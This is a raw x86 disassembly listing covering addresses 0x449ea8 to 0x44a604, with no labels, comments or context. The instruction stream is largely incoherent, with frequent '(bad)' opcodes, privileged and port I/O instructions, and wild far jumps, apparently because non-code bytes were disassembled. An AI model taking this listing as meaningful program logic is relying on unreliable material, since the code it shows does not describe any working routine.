  449ea8:	arpl   WORD PTR [eax],ax
  449eaa:	in     eax,dx
  449eab:	pcmpeqd mm2,QWORD PTR [ebx]
  449eae:	jmp    0xd94f10b3
  449eb3:	and    DWORD PTR [esi-0xb],esi
  449eb6:	mov    esp,0xb2fa71e7
  449ebb:	and    DWORD PTR [esi-0x7],esi
  449ebe:	(bad)  
  449ebf:	adc    al,0x5d
  449ec1:	jmp    0xba522e59
  449ec6:	mov    eax,0xb2cc3c17
  449ecb:	push   ds
  449ecc:	pop    ebp
  449ecd:	shl    BYTE PTR [edi-0x5d33acd6],0x10
  449ed4:	pop    ebp
  449ed5:	rol    BYTE PTR [ebx+0x4fbb7817],1
  449edb:	adc    ch,BYTE PTR [ebp+edi*4-0x6d]
  449edf:	xor    DWORD PTR [edi],ecx
  449ee1:	stos   BYTE PTR es:[edi],al
  449ee2:	push   esi
  449ee3:	adc    eax,0x17618461
  449ee8:	cmp    al,0x9d
  449eea:	popa   
  449eeb:	sbb    bh,BYTE PTR [ecx-0x7a]
  449eee:	inc    edx
  449eef:	push   cs
  449ef0:	ins    BYTE PTR es:[edi],dx
  449ef1:	add    ah,dl
  449ef3:	mov    eax,ds:0x73107477
  449ef8:	dec    ebx
  449ef9:	jae    0x449efb
  449efb:	add    BYTE PTR [eax],al
  449efd:	add    BYTE PTR [eax],al
  449eff:	sbb    ah,BYTE PTR [ecx-0x733a8f89]
  449f05:	pop    esi
  449f06:	push   esp
  449f07:	fidivr WORD PTR [edi+0x4b]
  449f0a:	arpl   sp,ax
  449f0c:	mov    al,ds:0x7ac07477
  449f11:	dec    ebx
  449f12:	jae    0x449ede
  449f14:	mov    al,ds:0x8b557077
  449f19:	pop    esi
  449f1a:	push   edi
  449f1b:	stc    
  449f1c:	scas   al,BYTE PTR es:[edi]
  449f1d:	ins    DWORD PTR es:[edi],dx
  449f1e:	add    DWORD PTR [esi+0x54537499],esi
  449f24:	(bad)  
  449f25:	jnp    0x449f99
  449f27:	mov    al,ds:0x944467aa
  449f2c:	lahf   
  449f2d:	ins    DWORD PTR es:[edi],dx
  449f2e:	jb     0x449ec0
  449f30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449f31:	je     0x449fa2
  449f33:	jnp    0x449fb4
  449f35:	outs   dx,DWORD PTR ds:[esi]
  449f36:	arpl   WORD PTR [ebp-0x4a],di
  449f39:	mov    DWORD PTR [edx],0x537499aa
  449f3f:	xchg   esp,eax
  449f40:	(bad)  
  449f41:	jnp    0x449fb5
  449f43:	nop
  449f44:	stos   BYTE PTR es:[edi],al
  449f45:	addr16 inc esp
  449f47:	les    ebx,FWORD PTR [edi-0x613f8d93]
  449f4d:	je     0x449fbe
  449f4f:	retf   
  449f50:	jg     0x449fc1
  449f52:	arpl   bp,bx
  449f54:	scas   al,BYTE PTR es:[edi]
  449f55:	enter  0xea00,0xa0
  449f59:	addr16 jo 0x449fa1
  449f5c:	or     BYTE PTR [ebx+0x72],0x50
  449f60:	nop
  449f61:	addr16 push ebx
  449f63:	add    BYTE PTR [eax],al
  449f65:	add    BYTE PTR [eax],al
  449f67:	add    BYTE PTR [eax-0x6f],dl
  449f6a:	jb     0x449fcd
  449f6c:	adc    eax,0x26655eab
  449f71:	mov    dh,0xd9
  449f73:	add    BYTE PTR [eax-0x1f8721a4],dl
  449f79:	aas    
  449f7a:	rcr    DWORD PTR [esp+ebx*8+0x64],1
  449f7e:	idiv   DWORD PTR [eax-0x20]
  449f81:	cmp    bl,dh
  449f83:	pusha  
  449f84:	mov    ch,0x9b
  449f86:	or     al,0xda
  449f88:	nop
  449f89:	pop    esp
  449f8a:	fidivr WORD PTR [eax-0x40]
  449f8d:	pop    es
  449f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449f8f:	mov    al,fs:0xdb6bdcf8
  449f95:	div    bl
  449f97:	call   FWORD PTR [edi]
  449f99:	push   ecx
  449f9a:	adc    eax,DWORD PTR [ebx-0x5e]
  449f9d:	repnz loop 0x44a00b
  449fa0:	push   esp
  449fa1:	out    dx,al
  449fa2:	(bad)  [ebx-0x7e]
  449fa5:	lock repz dec edx
  449fa8:	jne    0x449f8c
  449faa:	adc    bl,BYTE PTR [eax]
  449fac:	xchg   ecx,eax
  449fad:	(bad)  
  449fae:	fld    TBYTE PTR [ecx+esi*2-0x49]
  449fb2:	mov    ebp,0xc9b6c68
  449fb7:	xchg   ebp,eax
  449fb8:	xchg   ecx,eax
  449fb9:	rcr    ch,cl
  449fbb:	dec    esi
  449fbc:	ins    DWORD PTR es:[edi],dx
  449fbd:	mov    edi,0xb83e4aee
  449fc2:	loope  0x44a029
  449fc4:	arpl   WORD PTR [edx-0x2a40000a],si
  449fca:	or     edi,DWORD PTR [edi]
  449fcc:	add    BYTE PTR [eax],al
  449fce:	add    BYTE PTR [eax],al
  449fd0:	add    BYTE PTR ds:0x3e5ca887,ch
  449fd6:	jo     0x449fb8
  449fd8:	addr16 inc ebx
  449fda:	jb     0x449fcc
  449fdc:	call   FWORD PTR [edi+0x27430c84]
  449fe2:	and    edx,0xbf60025c
  449fe8:	push   0x52cb47ec
  449fed:	add    al,0x6e
  449fef:	lds    esp,FWORD PTR [ebp-0x11]
  449ff2:	mov    dl,0xa4
  449ff4:	fcmove st,st(3)
  449ff6:	add    esi,esi
  449ff8:	add    esi,ecx
  449ffa:	mov    ah,0xa3
  449ffc:	out    0xbe,al
  449ffe:	cmc    
  449fff:	and    esi,0xfffffff0
  44a002:	push   ds
  44a003:	fwait
  44a004:	mov    eax,0xebb32bec
  44a009:	(bad)  
  44a00a:	mov    dl,0x47
  44a00c:	add    ah,dl
  44a00e:	setno  dl
  44a011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a012:	cmove  ebp,ebx
  44a015:	fst    QWORD PTR [ebx]
  44a017:	pop    edx
  44a018:	test   esp,0x1fd53def
  44a01e:	test   eax,0xfc2016f
  44a023:	pop    ecx
  44a024:	mov    ebp,0xb9580f7f
  44a029:	sub    edi,DWORD PTR fs:[ebx]
  44a02c:	in     al,dx
  44a02d:	dec    esi
  44a02e:	mov    dl,0xfd
  44a030:	add    DWORD PTR [edx+0xf],esp
  44a033:	sbb    ecx,eax
  44a035:	add    BYTE PTR [eax],al
  44a037:	add    BYTE PTR [eax],al
  44a039:	add    BYTE PTR [ebx+0x19],dh
  44a03c:	add    eax,0xff0f5ae7
  44a041:	add    edi,esi
  44a043:	mov    bl,0x23
  44a045:	out    0x36,eax
  44a047:	add    eax,0x135df81b
  44a04c:	sbb    dh,bh
  44a04e:	fs out dx,eax
  44a050:	fst    st(4)
  44a052:	mov    edi,0x4f01c4a8
  44a057:	and    bl,bl
  44a059:	fstp   QWORD PTR [edi+0x24]
  44a05c:	fchs   
  44a05e:	inc    esp
  44a05f:	and    eax,0x1d36d7c5
  44a064:	rcr    ebp,cl
  44a066:	xchg   edi,eax
  44a067:	test   al,0xbd
  44a069:	add    cl,bh
  44a06b:	or     eax,0xef8d0a2
  44a070:	setp   BYTE PTR [esi+0x7fb44e12]
  44a077:	adc    BYTE PTR [eax-0x65],bh
  44a07a:	dec    edx
  44a07b:	sbb    al,0x66
  44a07d:	jmp    0xa6515815
  44a082:	arpl   WORD PTR [edi],ax
  44a084:	jns    0x44a03b
  44a086:	cmp    esp,DWORD PTR [edx]
  44a088:	jb     0x44a012
  44a08a:	aaa    
  44a08b:	cld    
  44a08c:	ja     0x44a020
  44a08e:	cs push cs
  44a090:	jne    0x75b68828
  44a096:	pusha  
  44a097:	sbb    esi,DWORD PTR [ebx+0x3a]
  44a09a:	and    DWORD PTR [edx],edx
  44a09c:	dec    esi
  44a09d:	push   esp
  44a09e:	add    BYTE PTR [eax],al
  44a0a0:	add    BYTE PTR [eax],al
  44a0a2:	add    BYTE PTR [eax],ah
  44a0a4:	adc    BYTE PTR [eax+0x5b],bh
  44a0a7:	cmp    eax,0x3b2a661c
  44a0ac:	pop    ss
  44a0ad:	jns    0x44a0ec
  44a0af:	xchg   esp,eax
  44a0b0:	cmp    ecx,DWORD PTR [edi]
  44a0b2:	sub    bh,dh
  44a0b4:	push   es
  44a0b5:	outs   dx,BYTE PTR ds:[esi]
  44a0b6:	cmp    eax,0x3e5cf7f1
  44a0bb:	out    dx,eax
  44a0bc:	push   es
  44a0bd:	pop    esp
  44a0be:	sbb    dl,ch
  44a0c0:	and    al,0x42
  44a0c2:	sbb    dh,cl
  44a0c4:	and    DWORD PTR [eax-0x17],eax
  44a0c7:	xchg   ebx,eax
  44a0c8:	dec    ebp
  44a0c9:	push   cs
  44a0ca:	sbb    eax,0xfc7410bb
  44a0cf:	ret    
  44a0d0:	neg    DWORD PTR [eax+edx*1-0x3e]
  44a0d4:	sbb    bh,BYTE PTR [ebx+0xc]
  44a0d7:	mov    bl,0x6
  44a0d9:	inc    ecx
  44a0da:	or     al,bl
  44a0dc:	push   ss
  44a0dd:	jb     0x44a09d
  44a0df:	xchg   ebx,eax
  44a0e0:	mov    edi,0x19c7a80e
  44a0e5:	(bad)  
  44a0e6:	fisubr DWORD PTR [edi-0x4f3d8805]
  44a0ec:	or     eax,0x864b003f
  44a0f1:	jp     0x44a15c
  44a0f3:	push   ebp
  44a0f4:	xchg   edx,eax
  44a0f5:	dec    ecx
  44a0f6:	cmp    dh,BYTE PTR gs:[ebx-0x76cffe85]
  44a0fd:	ja     0x44a173
  44a0ff:	add    BYTE PTR [esi-0x69d59a8c],cl
  44a105:	pop    ebp
  44a106:	je     0x44a108
  44a108:	add    BYTE PTR [eax],al
  44a10a:	add    BYTE PTR [eax],al
  44a10c:	or     al,0x8a
  44a10e:	cmp    eax,0x4496fc68
  44a113:	outs   dx,DWORD PTR ds:[esi]
  44a114:	into   
  44a115:	mov    DWORD PTR [ebx],ebp
  44a117:	js     0x44a137
  44a119:	mov    bl,0x4d
  44a11b:	inc    esp
  44a11c:	pop    ds
  44a11d:	outs   dx,BYTE PTR ds:[esi]
  44a11e:	pop    eax
  44a11f:	dec    ecx
  44a120:	cli    
  44a121:	fdiv   QWORD PTR [eax]
  44a123:	lds    ecx,FWORD PTR fs:[edx-0x4cee0018]
  44a12a:	ds popa 
  44a12c:	mov    ebp,0xd06b3d86
  44a131:	sahf   
  44a132:	outs   dx,DWORD PTR ds:[esi]
  44a134:	data16 mov ds:0xb30d0059,al
  44a13a:	ds popa 
  44a13c:	mov    ebp,0xb86e5b86
  44a141:	mov    eax,ds:0x7f9c7471
  44a146:	js     0x44a1a9
  44a148:	call   0x65b2:0xe9575d91
  44a14f:	add    DWORD PTR [esi-0x5c],edi
  44a152:	jb     0x44a1c7
  44a154:	leave  
  44a155:	pushf  
  44a156:	ja     0x44a1c6
  44a158:	mov    ebp,0xc1005990
  44a15d:	lods   eax,DWORD PTR ds:[esi]
  44a15e:	ja     0x44a1d6
  44a160:	mov    bh,0x9f
  44a162:	js     0x44a1d6
  44a164:	ror    BYTE PTR [eax-0x4d07998c],0x50
  44a16b:	add    BYTE PTR [eax+0x6bf369],dl
  44a171:	add    BYTE PTR [eax],al
  44a173:	add    BYTE PTR [eax],al
  44a175:	sub    BYTE PTR [edi-0x35],cl
  44a178:	gs hlt 
  44a17a:	push   ebp
  44a17b:	retf   
  44a17c:	arpl   bp,bp
  44a17e:	push   ebp
  44a17f:	repz fs cmc 
  44a182:	inc    esp
  44a183:	or     al,0x60
  44a185:	nop
  44a186:	dec    ebx
  44a187:	repz imul edi,eax,0x62
  44a18b:	loope  0x44a1c8
  44a18d:	stc    
  44a18e:	dec    ecx
  44a18f:	out    dx,eax
  44a190:	(bad)  
  44a191:	in     al,0x2c
  44a193:	loop   0x44a20d
  44a195:	mov    edi,0x90900c9b
  44a19a:	dec    ebx
  44a19b:	repz imul edi,DWORD PTR [eax-0x509b10b7],0x25
  44a1a3:	out    dx,eax
  44a1a4:	cmp    eax,0x52ef27a9
  44a1a9:	mov    al,ds:0x904ef1f6
  44a1ae:	mov    ebp,0x7b15012
  44a1b3:	retf   
  44a1b4:	inc    eax
  44a1b5:	lods   al,BYTE PTR ds:[esi]
  44a1b6:	out    dx,eax
  44a1b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a1b8:	ja     0x44a13e
  44a1ba:	test   ah,0x72
  44a1bd:	jns    0x44a1b3
  44a1bf:	les    ecx,FWORD PTR [esi-0x70]
  44a1c2:	mov    bh,0xb
  44a1c4:	push   ebx
  44a1c5:	jl     0x44a1b0
  44a1c7:	shl    DWORD PTR [eax+eiz*2-0x23],1
  44a1cb:	retf   
  44a1cc:	jmp    edi
  44a1ce:	and    DWORD PTR [ebx],edx
  44a1d0:	push   eax
  44a1d1:	jno    0x44a19a
  44a1d3:	retf   0x6d51
  44a1d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a1d7:	(bad)  
  44a1d8:	ins    DWORD PTR es:[edi],dx
  44a1d9:	add    BYTE PTR [eax],al
  44a1db:	add    BYTE PTR [eax],al
  44a1dd:	add    BYTE PTR ds:0x3b62ebd9,dh
  44a1e3:	test   al,0xc0
  44a1e5:	pusha  
  44a1e6:	inc    ebx
  44a1e7:	mov    bl,0xbd
  44a1e9:	push   DWORD PTR [edi+0x24530d54]
  44a1ef:	mov    dl,0xc3
  44a1f1:	aad    0x52
  44a1f3:	sbb    al,ah
  44a1f5:	ret    0xa59f
  44a1f8:	adc    al,0x3
  44a1fa:	inc    ebx
  44a1fb:	push   ds
  44a1fc:	(bad)  
  44a1fd:	(bad)  
  44a1fe:	hlt    
  44a1ff:	and    bl,BYTE PTR [edi-0x345a7830]
  44a205:	add    ah,bl
  44a207:	push   ds
  44a208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a209:	(bad)  
  44a20a:	out    dx,eax
  44a20b:	and    BYTE PTR [ecx-0x5b4c45fd],al
  44a211:	out    dx,eax
  44a212:	loope  0x44a205
  44a214:	call   0xab03:0xa8fbd5f3
  44a21b:	mov    bl,0xa4
  44a21d:	out    dx,eax
  44a21e:	shl    ecx,0x82
  44a221:	repz int 0xfd
  44a224:	cmc    
  44a225:	add    ebx,DWORD PTR [eax-0x3e107b4d]
  44a22b:	icebp  
  44a22c:	(bad)  
  44a22d:	cmc    
  44a22e:	shl    BYTE PTR [edx+0x1ec30318],1
  44a234:	inc    esp
  44a235:	lds    esi,FWORD PTR [edx+eiz*1-0x4d2f44d0]
  44a23c:	sbb    eax,DWORD PTR [eax+eiz*2]
  44a23f:	adc    ebp,DWORD PTR [edx]
  44a241:	fadd   QWORD PTR [eax]
  44a243:	add    BYTE PTR [eax],al
  44a245:	add    BYTE PTR [eax],al
  44a247:	(bad)  
  44a248:	mov    cr0,eax
  44a24b:	sbb    DWORD PTR [ebx],0x1f4ddf28
  44a251:	sub    esp,esi
  44a253:	dec    esp
  44a254:	and    BYTE PTR [ecx],ch
  44a256:	add    al,0x64
  44a258:	mov    dl,0x25
  44a25a:	jecxz  0x44a2c7
  44a25c:	sbb    ah,BYTE PTR [edi]
  44a25e:	out    dx,eax
  44a25f:	outs   dx,BYTE PTR ds:[esi]
  44a260:	push   ds
  44a261:	adc    edx,ebp
  44a263:	aas    
  44a264:	adc    edx,DWORD PTR ds:0xf5fd42df
  44a26a:	add    edx,DWORD PTR [edx+esi*4+0xe]
  44a26e:	sbb    DWORD PTR [ebx-0x34d888e8],esi
  44a274:	push   cs
  44a275:	jae    0x44a223
  44a277:	mov    ebx,0xa4cf7218
  44a27c:	sbb    DWORD PTR [eax-0x39],edi
  44a27f:	shl    BYTE PTR [eax+ebp*8+0x6e02935f],0xbd
  44a287:	imul   eax,DWORD PTR [edx],0x72
  44a28a:	int3   
  44a28b:	pop    eax
  44a28c:	push   ss
  44a28d:	jb     0x44a23b
  44a28f:	imul   ebx,DWORD PTR [eax],0x72
  44a292:	mov    edi,0x97781b64
  44a297:	inc    eax
  44a298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a299:	call   0x6e473607
  44a29e:	popf   
  44a29f:	cmp    ebp,edi
  44a2a1:	ins    DWORD PTR es:[edi],dx
  44a2a2:	xchg   ebp,eax
  44a2a3:	xor    al,0xc
  44a2a5:	cmp    al,0x79
  44a2a7:	adc    WORD PTR [eax-0x17],ax
  44a2ab:	add    BYTE PTR [eax],al
  44a2ad:	add    BYTE PTR [eax],al
  44a2af:	add    BYTE PTR [ebx+0x3d9c0e1f],dl
  44a2b5:	adc    BYTE PTR [edx+0x7f],al
  44a2b8:	dec    esi
  44a2b9:	and    DWORD PTR [eax+ecx*2+0x1c],ebp
  44a2bd:	pop    es
  44a2be:	dec    esi
  44a2bf:	jmp    0x3a540157
  44a2c4:	aam    0xe7
  44a2c6:	jno    0x44a305
  44a2c8:	icebp  
  44a2c9:	pop    ss
  44a2ca:	jb     0x44a2eb
  44a2cc:	in     eax,dx
  44a2cd:	punpckldq mm0,DWORD PTR [edi+ecx*8-0x5d]
  44a2d2:	call   0x57442f48
  44a2d7:	and    eax,0x1d720ff1
  44a2dc:	icebp  
  44a2dd:	clc    
  44a2de:	jno    0x44a300
  44a2e0:	iret   
  44a2e1:	mov    ds:0x28c11e8,eax
  44a2e6:	outs   dx,BYTE PTR ds:[esi]
  44a2e7:	adc    eax,0x5bfaec
  44a2ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a2ed:	or     BYTE PTR [edi+edx*2-0x57],0xaf
  44a2f2:	cmp    al,BYTE PTR [eax]
  44a2f4:	cdq    
  44a2f5:	lea    esi,[eax+ebp*2+0x78]
  44a2f9:	xchg   edx,eax
  44a2fa:	inc    esp
  44a2fb:	inc    edx
  44a2fc:	fcom   DWORD PTR [eax-0x71328c8b]
  44a302:	pop    ebp
  44a303:	push   0x483bafd6
  44a308:	sub    eax,0x40504f74
  44a30d:	mov    ebp,0xaf4d6c4a
  44a312:	rol    DWORD PTR [eax],1
  44a314:	add    BYTE PTR [eax],al
  44a316:	add    BYTE PTR [eax],al
  44a318:	add    BYTE PTR [edx],bl
  44a31a:	sub    DWORD PTR [di+0x25],esp
  44a31e:	gs jno 0x44a38d
  44a321:	adc    eax,0x8505e92
  44a326:	xchg   ebx,eax
  44a327:	jo     0x44a380
  44a329:	imul   ebp,DWORD PTR [edi+0x7bfaffe8],0x7d186d73
  44a333:	inc    esp
  44a334:	dec    esp
  44a335:	and    BYTE PTR [ebp+0x4b],bh
  44a338:	push   esp
  44a339:	push   cs
  44a33a:	outs   dx,BYTE PTR ds:[esi]
  44a33b:	pop    esi
  44a33c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  44a33e:	je     0x44a328
  44a340:	dec    DWORD PTR [ebx-0x2b97c453]
  44a346:	mov    ch,BYTE PTR [ebp+eax*2-0x3f]
  44a34a:	xchg   ecx,eax
  44a34b:	ins    DWORD PTR es:[edi],dx
  44a34c:	jne    0x44a3b3
  44a34e:	xchg   ecx,eax
  44a34f:	pop    ecx
  44a350:	add    BYTE PTR [edx-0x52b3d49a],ch
  44a356:	fistp  WORD PTR [esi+ebp*1]
  44a359:	inc    ebp
  44a35a:	mov    ch,BYTE PTR [eax+eax*1-0x24]
  44a35e:	scas   al,BYTE PTR es:[edi]
  44a35f:	daa    
  44a360:	test   DWORD PTR gs:[ecx+0x5c7b655d],eax
  44a367:	outs   dx,DWORD PTR ds:[esi]
  44a368:	ins    DWORD PTR es:[edi],dx
  44a369:	nop
  44a36a:	mov    dh,0xcd
  44a36c:	ja     0x44a3d5
  44a36e:	cdq    
  44a36f:	or     al,0x10
  44a371:	nop
  44a372:	aad    0xed
  44a374:	arpl   WORD PTR ds:0x2d52ef9d,si
  44a37a:	mov    eax,0x71dd
  44a37f:	add    BYTE PTR [eax],al
  44a381:	add    BYTE PTR [ecx],bh
  44a383:	popf   
  44a384:	sti    
  44a385:	inc    edx
  44a386:	aaa    
  44a387:	jnp    0x44a381
  44a389:	pop    esp
  44a38a:	sbb    BYTE PTR [ebp+0xc],bh
  44a38d:	pop    es
  44a38e:	nop
  44a38f:	push   ebp
  44a390:	out    dx,eax
  44a391:	bound  eax,QWORD PTR [edx]
  44a393:	sbb    esp,0x6b
  44a396:	aad    0x6e
  44a398:	fnsave [edx-0xf]
  44a39b:	js     0x44a38c
  44a39d:	push   DWORD PTR [edi+0x7d]
  44a3a0:	or     al,0x3d
  44a3a2:	(bad)  
  44a3a3:	ins    BYTE PTR es:[edi],dx
  44a3a4:	fidivr WORD PTR [eax-0x20]
  44a3a7:	aas    
  44a3a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a3a9:	pop    esp
  44a3aa:	jecxz  0x44a3e8
  44a3ac:	repz pop esi
  44a3ae:	in     eax,dx
  44a3af:	mov    ecx,DWORD PTR [ebx+edx*2]
  44a3b2:	mov    ch,0x2c
  44a3b4:	fbstp  TBYTE PTR [ecx-0x7d]
  44a3b7:	pop    ebp
  44a3b8:	add    bl,BYTE PTR [esp+ebp*4+0x2f]
  44a3bc:	or     al,0x79
  44a3be:	nop
  44a3bf:	dec    esp
  44a3c0:	ror    DWORD PTR [ebx-0x4f],0x1c
  44a3c4:	lds    eax,FWORD PTR [ebp+ebp*4+0x6]
  44a3c8:	test   eax,0x12f6b571
  44a3cd:	sbb    DWORD PTR [eax-0x7dbd3e34],edx
  44a3d3:	imul   bl
  44a3d5:	imul   ebp,DWORD PTR [ebp-0x1e],0xffffffc0
  44a3d9:	jb     0x44a35f
  44a3db:	jmp    0x750c:0x8b6d62c0
  44a3e2:	nop
  44a3e3:	int3   
  44a3e4:	ror    DWORD PTR [eax+eax*1+0x0],0x0
  44a3e9:	add    BYTE PTR [eax],al
  44a3eb:	jbe    0x44a39f
  44a3ed:	(bad)  
  44a3ee:	aad    0x68
  44a3f0:	es jmp edx
  44a3f3:	jae    0x44a400
  44a3f5:	cld    
  44a3f6:	fmulp  st(7),st
  44a3f8:	mov    eax,ds:0x11530426
  44a3fd:	pop    ds
  44a3fe:	(bad)  
  44a3ff:	sub    BYTE PTR [esi],ah
  44a401:	jmp    edx
  44a403:	xor    ecx,DWORD PTR [ebx]
  44a405:	(bad)  
  44a407:	inc    edx
  44a408:	pop    ss
  44a409:	adc    eax,0xca0b21ef
  44a40e:	jmp    0x1153:0x3b9a19f
  44a415:	scas   eax,DWORD PTR es:[edi]
  44a416:	aad    0xf8
  44a418:	es iret 
  44a41a:	loop   0x44a40f
  44a41c:	or     ecx,esp
  44a41e:	fidivr WORD PTR [edx+ebx*1-0x4d1bfc0a]
  44a425:	mov    ah,0xd4
  44a427:	ret    0xa217
  44a42a:	shl    ecx,cl
  44a42c:	adc    DWORD PTR [esi-0x68f12e16],ebp
  44a432:	aad    0xea
  44a434:	pop    ss
  44a435:	mov    al,BYTE PTR [ebx]
  44a437:	sub    BYTE PTR [edx+0x13e4f1b4],dh
  44a43d:	push   0xffffffde
  44a43f:	loop   0x44a467
  44a441:	fidiv  WORD PTR fs:[eax-0x282a4ef1]
  44a448:	stc    
  44a449:	imul   edx,esp,0x44213b1
  44a44f:	add    BYTE PTR [eax],al
  44a451:	add    BYTE PTR [eax],al
  44a453:	add    BYTE PTR [edx+esi*4-0x143d47cc],dl
  44a45a:	cmp    DWORD PTR [esi-0x2ed4ee7f],edi
  44a460:	jnp    0x44a486
  44a462:	aas    
  44a463:	(bad)  
  44a464:	pop    esi
  44a465:	mov    dl,0x62
  44a467:	add    ah,BYTE PTR [ebx+0x26]
  44a46a:	(bad)  
  44a46c:	retf   
  44a46d:	push   ss
  44a46e:	jo     0x44a497
  44a470:	loop   0x44a489
  44a472:	jp     0x44a4a2
  44a474:	iret   
  44a475:	jmp    0x19d87fcc
  44a47a:	jnp    0x44a488
  44a47c:	and    esp,0x14e80538
  44a482:	setb   BYTE PTR [edx-0x80a8e1f]
  44a489:	std    
  44a48a:	pusha  
  44a48b:	add    BYTE PTR [ecx-0x63f7b403],dh
  44a491:	and    ecx,DWORD PTR [edi]
  44a493:	sbb    DWORD PTR [ebp+esi*8+0xcb2c45c],edx
  44a49a:	jb     0x44a446
  44a49c:	fs pop ss
  44a49e:	pop    edi
  44a49f:	enter  0xb77,0x6d
  44a4a3:	aad    0x5e
  44a4a5:	bnd jne 0x44a45d
  44a4a8:	pop    esi
  44a4a9:	adc    ebx,DWORD PTR [edi-0x17]
  44a4ac:	xchg   ebx,eax
  44a4ad:	loope  0x44a4bd
  44a4af:	stos   BYTE PTR es:[edi],al
  44a4b0:	popa   
  44a4b1:	jmp    FWORD PTR [ebp-0x63]
  44a4b4:	ds cmc 
  44a4b6:	ja     0x44a444
  44a4b8:	add    BYTE PTR [eax],al
  44a4ba:	add    BYTE PTR [eax],al
  44a4bc:	add    BYTE PTR [ebx+0x13],ah
  44a4bf:	arpl   WORD PTR [eax-0x5a8debcf],ax
  44a4c5:	push   eax
  44a4c6:	mov    al,ds:0x39130e8
  44a4cb:	jb     0x44a45a
  44a4cd:	push   esi
  44a4ce:	adc    eax,0xa31a663
  44a4d3:	jb     0x44a45f
  44a4d5:	aaa    
  44a4d6:	mov    al,ds:0xde94ece8
  44a4db:	jno    0x44a52a
  44a4dd:	sub    DWORD PTR [edx+esi*2],ecx
  44a4e0:	test   BYTE PTR es:[ecx],0x72
  44a4e4:	dec    edx
  44a4e5:	call   0xeb458d89
  44a4ea:	mov    dh,0x2a
  44a4ec:	gs inc ebp
  44a4ee:	mov    DWORD PTR [ebp+eiz*2-0x43],esi
  44a4f2:	ja     0x44a4dc
  44a4f4:	dec    DWORD PTR [edx-0x48]
  44a4f7:	cmp    al,0x65
  44a4f9:	jp     0x44a575
  44a4fb:	jno    0x44a56f
  44a4fd:	mov    WORD PTR [edx+0x4d],gs
  44a500:	add    BYTE PTR [ebx-0x48],al
  44a503:	cmp    esp,DWORD PTR [ecx-0x61]
  44a506:	mov    DWORD PTR [ebx+eax*2],esp
  44a509:	test   eax,0x9a02dcb3
  44a50e:	mov    DWORD PTR [edx+edx*2-0x64],esi
  44a512:	xchg   edi,eax
  44a513:	je     0x44a567
  44a515:	mov    fs,WORD PTR [eax+ebp*8+0x27b51dff]
  44a51c:	shr    BYTE PTR fs:[ecx+0x6c],0x75
  44a521:	add    BYTE PTR [eax],al
  44a523:	add    BYTE PTR [eax],al
  44a525:	add    BYTE PTR [edx-0x75],ch
  44a528:	call   0x3bfd882c
  44a52d:	gs cmp eax,0x3e657759
  44a533:	xor    DWORD PTR [ecx+0x72],0x2d
  44a537:	test   BYTE PTR [esi+0x67],bl
  44a53a:	sub    al,0x7b
  44a53c:	call   0x4bf7e040
  44a541:	jb     0x44a54f
  44a543:	xchg   esi,eax
  44a544:	je     0x44a5ab
  44a546:	std    
  44a547:	ja     0x44a5a2
  44a549:	add    BYTE PTR [edx-0x4d],cl
  44a54c:	dec    esp
  44a54d:	imul   edi,DWORD PTR [ebp+0x29746c75],0xfe01f4b3
  44a557:	mov    DWORD PTR [esp+eax*2-0x10],esi
  44a55b:	je     0x44a5d4
  44a55d:	je     0x44a519
  44a55f:	mov    dh,0x38
  44a561:	add    BYTE PTR [edx-0x78],ch
  44a564:	dec    ebx
  44a565:	popa   
  44a566:	nop
  44a567:	std    
  44a568:	cmc    
  44a569:	cmp    ebx,DWORD PTR [ecx-0x35]
  44a56c:	lahf   
  44a56d:	pop    esp
  44a56e:	jae    0x44a54d
  44a570:	stc    
  44a571:	data16 mov WORD PTR [edi+edi*1],cx
  44a576:	push   esp
  44a577:	sar    bh,cl
  44a579:	xor    DWORD PTR [esi-0x6f9c210b],esi
  44a57f:	push   ds
  44a580:	or     al,0x5e
  44a582:	bound  esi,QWORD PTR [esi-0x52cb9f0b]
  44a588:	shr    BYTE PTR [eax+0x0],0x0
  44a58c:	add    BYTE PTR [eax],al
  44a58e:	add    BYTE PTR [esi],dh
  44a590:	mov    bh,0xdb
  44a592:	(bad)  
  44a593:	mov    edi,0x2d5f0bfe
  44a598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a599:	repz pop ebx
  44a59b:	xor    al,0x9b
  44a59d:	sti    
  44a59e:	gs mov al,cs:0x6090300c
  44a5a5:	mov    eax,ds:0xc0764f40
  44a5aa:	inc    esi
  44a5ab:	push   es
  44a5ac:	outs   dx,DWORD PTR ds:[esi]
  44a5ad:	ret    0xf163
  44a5b0:	jnp    0x44a56e
  44a5b2:	pop    esp
  44a5b3:	hlt    
  44a5b4:	cmp    edi,esi
  44a5b6:	jb     0x44a5b5
  44a5b8:	outs   dx,DWORD PTR ds:[esi]
  44a5b9:	sar    bh,0x6f
  44a5bc:	push   edi
  44a5bd:	or     al,0x4f
  44a5bf:	ret    
  44a5c0:	dec    edx
  44a5c1:	mov    eax,ds:0xc2fee5c
  44a5c6:	dec    eax
  44a5c7:	nop
  44a5c8:	mov    eax,fs:0xf12ee240
  44a5ce:	ins    DWORD PTR es:[edi],dx
  44a5cf:	nop
  44a5d0:	popa   
  44a5d1:	or     al,0x4f
  44a5d3:	jecxz  0x44a61f
  44a5d5:	mov    eax,ds:0xde42c26b
  44a5da:	pop    esi
  44a5db:	les    esi,FWORD PTR [ebx+edx*8]
  44a5de:	pop    ebx
  44a5df:	lods   al,BYTE PTR ds:[esi]
  44a5e0:	sbb    edi,esi
  44a5e2:	jb     0x44a587
  44a5e4:	mov    dl,0x28
  44a5e6:	add    al,0x82
  44a5e8:	mov    dl,0x20
  44a5ea:	mov    ch,0x50
  44a5ec:	repz pop ecx
  44a5ee:	call   0xd589bd74
  44a5f3:	add    BYTE PTR [eax],al
  44a5f5:	add    BYTE PTR [eax],al
  44a5f7:	add    BYTE PTR [ebx+0xd],cl
  44a5fa:	add    eax,0x580b81d8
  44a5ff:	jmp    0x45e5854
  44a604:	push   edi
